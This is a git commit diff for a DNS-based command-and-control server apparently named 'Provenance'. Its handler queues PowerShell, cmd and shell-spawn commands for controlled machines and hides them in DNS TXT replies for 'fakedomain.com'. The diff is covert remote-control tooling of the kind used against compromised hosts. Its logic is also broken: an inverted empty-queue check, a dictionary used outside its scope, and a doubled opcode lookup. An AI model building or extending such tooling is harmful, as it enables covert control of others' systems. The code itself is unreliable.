3c1738d9027a07d672e0f97f79520ff1b4059a08
Ryan Cervantes <rxc3202@rit.edu>
2020-01-08 16:32:24 -0500

    added modular packet sending
    added dictionaries within the individualclienthandler function
    send_cmd in order to dynamically create packets depending on the
    machine's settings

--- machine.py
+++ machine.py
@@ -5,9 +5,8 @@ import threading
 class IndividualClientHandler(BaseRequestHandler):
     """ This represents a machine being controlled by Provenance"""
 
-
     """ Builtin Functions"""
-    def __init__(self, request, client_address, server, name=None):
+    def __init__(self, request, client_address, server, rrtype="TXT", name=None):
         # Superclass initialization
         self.server = server
         self.request = request
@@ -19,7 +18,7 @@ class IndividualClientHandler(BaseRequestHandler):
         self.active = False
         self.record_type = "TXT"
         self.last_request_id = None
-        self.queued_commands = ["<1>:ls"]
+        self.queued_commands = [("POWERSHELL_EXECUTE", "ls")]
         self.sent_commands = []
     
     def __repr__(self):
@@ -41,25 +40,36 @@ class IndividualClientHandler(BaseRequestHandler):
 
 
     """ Provenance Specific Functions"""
-    def queue_cmd(self, cmd):
-        self.queued_commands.append(cmd)
+    def queue_cmd(self, type, cmd):
+        self.queued_commands.append((command_type[type], cmd))
 
     def send_cmd(self, request):
-        if not self.queued_commands:
-            # TODO: send Nop
-            return
+        RR = {
+            "TXT": (dnslib.QTYPE.TXT, dnslib.TXT),
+		}
+        command_type = {
+            "NONE": 0,
+            "POWERSHELL_EXECUTE": 1,
+            "CMD_EXECUTE" : 2,
+            "SPAWN_SHELL": 3 
+        }
 
-        # TODO: use dictionary switch to encode different packets
-        cmd = self.queued_commands.pop()
+        if not self.queued_commands:
+			# TODO: use dictionary switch to encode different packets
+            opcode, cmd = self.queued_commands.pop()
+        else:
+            opcode, cmd = (command_type["NONE"], "")
+
+        rr_type, rr_constructor  = RR[self.record_type]
         # Generate skeleton question for packet
         command_packet = request.reply() 
         # Generate the response to the question
         command_packet.add_answer(
             dnslib.RR(
                 rname="fakedomain.com",
-				rtype=dnslib.QTYPE.TXT,
+				rtype=rr_type,
                 rclass=dnslib.CLASS.IN,
-				rdata=dnslib.TXT(cmd),
+				rdata=rr_constructor(f"<{command_type[opcode]}>:{cmd}"),
                 ttl=1337))
         # send command
         socket = self.request[1]
